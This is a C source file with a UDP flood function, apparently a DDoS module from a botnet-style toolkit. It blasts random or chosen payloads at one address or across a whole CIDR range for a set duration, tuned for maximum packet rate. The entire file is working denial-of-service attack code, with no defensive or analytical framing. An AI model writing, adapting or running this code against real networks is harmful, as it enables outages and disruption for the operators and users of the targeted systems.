#define _GNU_SOURCE
#include "headers/attack_params.h"

void* udpplain_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int psize_min = params->len_min > 0 ? params->len_min : 1;
    int psize_max = params->len_max > 0 ? params->len_max : psize_min;
    if (psize_min < 1)    psize_min = 1;
    if (psize_max > 1472) psize_max = 1472; /* max UDP payload without fragmentation */
    if (psize_max < psize_min) psize_max = psize_min;

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) return NULL;

    /* 8MB send buffer — kernel won't block us */
    int sndbuf = 8 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    /* Pre-fill a random data pool once — reuse every iteration */
    static unsigned char data_pool[1472];
    for (int i = 0; i < 1472; i++)
        data_pool[i] = (unsigned char)(rand() & 0xFF);
    if (params->msg_len > 0 && params->msg)
        memcpy(data_pool, params->msg,
               params->msg_len < 1472 ? (size_t)params->msg_len : 1472);

    int usleep_min = params->usleep_min > 0 ? params->usleep_min : 0;
    int usleep_max = params->usleep_max > 0 ? params->usleep_max : 0;
    int use_usleep  = usleep_min > 0;

    time_t end_time = time(NULL) + params->duration;
    uint64_t pkt = 0;

    if (params->cidr > 0) {
        uint32_t base  = ntohl(params->base_ip);
        uint32_t mask  = params->cidr == 32 ? 0xFFFFFFFF : (~0U << (32 - params->cidr));
        uint32_t start = base & mask;
        uint32_t end   = start | (~mask);
        struct sockaddr_in target = params->target_addr;

        while (params->active) {
            /* check time every 8192 packets to avoid syscall per-loop */
            if ((pkt & 8191) == 0 && time(NULL) >= end_time) break;

            int psize = (psize_min == psize_max) ? psize_min
                      : psize_min + (rand() % (psize_max - psize_min + 1));

            if (params->cidr == 32) {
                target.sin_addr.s_addr = htonl(start);
                sendto(fd, data_pool, psize, MSG_NOSIGNAL | MSG_DONTWAIT,
                       (struct sockaddr*)&target, sizeof(target));
            } else if (params->cidr == 31) {
                target.sin_addr.s_addr = htonl(start);
                sendto(fd, data_pool, psize, MSG_NOSIGNAL | MSG_DONTWAIT,
                       (struct sockaddr*)&target, sizeof(target));
                target.sin_addr.s_addr = htonl(end);
                sendto(fd, data_pool, psize, MSG_NOSIGNAL | MSG_DONTWAIT,
                       (struct sockaddr*)&target, sizeof(target));
            } else {
                for (uint32_t ip = start + 1; ip < end; ++ip) {
                    target.sin_addr.s_addr = htonl(ip);
                    sendto(fd, data_pool, psize, MSG_NOSIGNAL | MSG_DONTWAIT,
                           (struct sockaddr*)&target, sizeof(target));
                    pkt++;
                }
                goto skip_delay;
            }
            pkt++;
            skip_delay:
            if (use_usleep) {
                int delay = usleep_min;
                if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1);
                usleep(delay);
            }
        }
    } else {
        /* connect() so sendto becomes send() — faster kernel path */
        connect(fd, (struct sockaddr*)&params->target_addr, sizeof(params->target_addr));

        while (params->active) {
            if ((pkt & 8191) == 0 && time(NULL) >= end_time) break;

            int psize = (psize_min == psize_max) ? psize_min
                      : psize_min + (rand() % (psize_max - psize_min + 1));

            send(fd, data_pool, psize, MSG_NOSIGNAL | MSG_DONTWAIT);
            pkt++;

            if (use_usleep) {
                int delay = usleep_min;
                if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1);
                usleep(delay);
            }
        }
    }

    close(fd);
    return NULL;
}
